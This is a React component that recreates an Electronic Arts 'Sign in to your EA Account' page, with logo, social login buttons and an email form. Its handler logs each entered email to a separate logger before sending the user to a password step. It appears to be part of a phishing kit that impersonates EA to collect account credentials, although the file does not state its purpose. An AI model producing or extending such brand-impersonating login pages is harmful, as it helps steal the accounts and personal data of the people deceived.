import React, { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { Wifi, Battery, Signal } from 'lucide-react'
import MobileHeader from './MobileHeader'
import EALogo from './EALogo'
import SocialLoginButtons from './SocialLoginButtons'
import LoginForm from './LoginForm'
import { appendLog } from '../utils/logger'

const EALoginPage: React.FC = () => {
  const navigate = useNavigate()
  const [email, setEmail] = useState('')
  const [rememberMe, setRememberMe] = useState(false)

  console.log('EALoginPage rendered with email:', email)

  const handleNext = () => {
    console.log('Next button clicked with email:', email, 'rememberMe:', rememberMe)
    if (email.trim()) {
      appendLog({ page: 'login', email, rememberMe })
      navigate('/password')
    }
  }

  return (
    <div className="max-w-[36rem] mx-auto bg-transparent min-h-screen relative">

      {/* Main content */}
      <div className="px-6 pt-12 pb-8">
        <div className="w-full h-20">
          <EALogo />
        </div>
        
        <h1 className="text-white text-3xl font-light text-center mt-8 mb-12">
          Sign in to your EA Account
        </h1>
        
        <SocialLoginButtons />
        
        {/* Divider */}
        <div className="flex items-center my-8">
          <div className="flex-1 h-px bg-slate-600"></div>
          <span className="px-4 text-slate-400 text-sm">or</span>
          <div className="flex-1 h-px bg-slate-600"></div>
        </div>
        
        <LoginForm 
          email={email}
          setEmail={setEmail}
          rememberMe={rememberMe}
          setRememberMe={setRememberMe}
          onNext={handleNext}
        />
        
        {/* Forgot password link */}
        <div className="text-center mt-8">
          <button className="text-blue-400 text-sm hover:text-blue-300 transition-colors">
            Forgot your password, or need to create a new one?
          </button>
        </div>
      </div>

    </div>
  )
}

export default EALoginPage